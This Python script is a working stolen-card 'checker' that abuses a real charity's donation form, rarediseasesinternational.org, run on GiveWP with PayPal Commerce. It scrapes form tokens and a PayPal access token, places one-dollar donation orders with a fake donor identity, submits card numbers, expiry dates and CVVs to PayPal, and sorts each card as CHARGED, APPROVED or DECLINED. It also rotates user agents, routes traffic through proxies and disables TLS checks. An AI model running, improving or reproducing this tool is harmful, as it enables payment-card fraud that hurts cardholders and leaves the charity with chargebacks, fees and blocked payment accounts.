import requests
import re
import base64
import urllib3
from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent

urllib3.disable_warnings()

def check_paypal_cc(ccx, proxy=None):
    """Extracted from your Braintree script"""
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return "DECLINED", "Invalid Format"
       
        n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3].strip()
        
        us = generate_user_agent()
        user = generate_user_agent()
        
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies.update(proxy)
            
        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
            
        with session as r:
            headers_get = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'upgrade-insecure-requests': '1',
                'user-agent': us,
            }
            
            response = r.get('https://www.rarediseasesinternational.org/donate/', headers=headers_get, timeout=30)
            
            if 'cf-ray' in response.headers or 'Cloudflare' in response.text or response.status_code == 403:
                return "DECLINED", "Cloudflare Block"
            
            m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
            m2 = re.search(r'name="give-form-id" value="(.*?)"', response.text)
            m3 = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
            m4 = re.search(r'"data-client-token":"(.*?)"', response.text)
            
            if not all([m1, m2, m3, m4]):
                return "DECLINED", "Page Load Error"
            
            id_form1, id_form2, nonec, enc = m1.group(1), m2.group(1), m3.group(1), m4.group(1)
            
            dec = base64.b64decode(enc).decode('utf-8')
            m_au = re.search(r'"accessToken":"(.*?)"', dec)
            if not m_au:
                return "DECLINED", "Token Error"
            au = m_au.group(1)
            
            headers_post = {
                'origin': 'https://www.rarediseasesinternational.org/donate/',
                'referer': 'https://www.rarediseasesinternational.org/donate/',
                'user-agent': us,
                'x-requested-with': 'XMLHttpRequest',
            }
            
            data_post = {
                'give-honeypot': '', 'give-form-id-prefix': id_form1, 'give-form-id': id_form2,
                'give-form-title': '', 'give-current-url': 'https://www.rarediseasesinternational.org/donate/',
                'give-form-url': 'https://www.rarediseasesinternational.org/donate/',
                'give-form-minimum': '1', 'give-form-maximum': '999999.99', 'give-form-hash': nonec,
                'give-price-id': '3', 'give-recurring-logged-in-only': '', 'give-logged-in-only': '1',
                '_give_is_donation_recurring': '0', 'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                'give-amount': '1', 'give_stripe_payment_method': '', 'payment-mode': 'paypal-commerce',
                'give_first': 'xunarch', 'give_last': 'xunarch', 'give_email': 'xunarch@gmail.com',
                'card_name': 'xunarch', 'card_exp_month': '', 'card_exp_year': '', 'give_action': 'purchase',
                'give-gateway': 'paypal-commerce', 'action': 'give_process_donation', 'give_ajax': 'true',
            }
            
            r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', headers=headers_post, data=data_post, timeout=30)
            
            data_multipart = MultipartEncoder({
                'give-honeypot': (None, ''), 'give-form-id-prefix': (None, id_form1), 'give-form-id': (None, id_form2),
                'give-form-title': (None, ''), 'give-current-url': (None, 'https://www.rarediseasesinternational.org/donate/'),
                'give-form-url': (None, 'https://www.rarediseasesinternational.org/donate/'),
                'give-form-minimum': (None, '1'), 'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, nonec), 'give-price-id': (None, '3'), 'give-recurring-logged-in-only': (None, ''),
                'give-logged-in-only': (None, '1'), '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, '1'), 'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, 'xunarch'),
                'give_last': (None, 'xunarch'), 'give_email': (None, 'xunarch@gmail.com'),
                'card_name': (None, 'xunarch'), 'card_exp_month': (None, ''), 'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers_multipart = {
                'content-type': data_multipart.content_type, 'origin': 'https://www.rarediseasesinternational.org/donate/',
                'referer': 'https://www.rarediseasesinternational.org/donate/', 'user-agent': us,
            }
            
            params = {'action': 'give_paypal_commerce_create_order'}
            response = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers_multipart, data=data_multipart, timeout=30)
            tok = response.json()['data']['id']
            
            headers_paypal = {
                'authorization': f'Bearer {au}', 'content-type': 'application/json',
                'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835', 'user-agent': user,
            }
            
            json_data_paypal = {
                'payment_source': {'card': {'number': n, 'expiry': f'20{yy}-{mm}', 'security_code': cvc,
                'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}},
                'application_context': {'vault': False},
            }
            
            r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers_paypal, json=json_data_paypal, timeout=30, verify=False)
            
            data_approve = data_multipart # Reuse structure
            params = {'action': 'give_paypal_commerce_approve_order', 'order': tok}
            response = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers_multipart, data=data_approve, timeout=30, verify=False)
            
            text_up = response.text.upper()
            
            if any(k in text_up for k in ['APPROVESTATE":"APPROVED', 'PARENTTYPE":"AUTH', 'THANK YOU FOR DONATION', '"SUCCESS":TRUE']):
                if '"ERRORS"' not in text_up and '"ERROR"' not in text_up:
                    return "CHARGED", "Thank you for donation"
            
            if 'INSUFFICIENT_FUNDS' in text_up: return "APPROVED", "INSUFFICIENT_FUNDS"
            elif 'CVV2_FAILURE' in text_up: return "APPROVED", "CVV2_FAILURE"
            elif 'IS3SECUREREQUIRED' in text_up or 'OTP' in text_up: return "DECLINED", "3D_REQUIRED"
            elif 'DO_NOT_HONOR' in text_up: return "DECLINED", "Do not honor"
            else:
                try:
                    err = response.json().get('data', {}).get('error', 'Transaction Failed')
                    return "DECLINED", str(err)
                except: return "DECLINED", "Transaction Failed"
                    
    except Exception as e:
        msg = str(e)
        if "Read timed out" in msg: return "DECLINED", "Read Timeout"
        return "DECLINED", f"Error: {msg[:30]}"
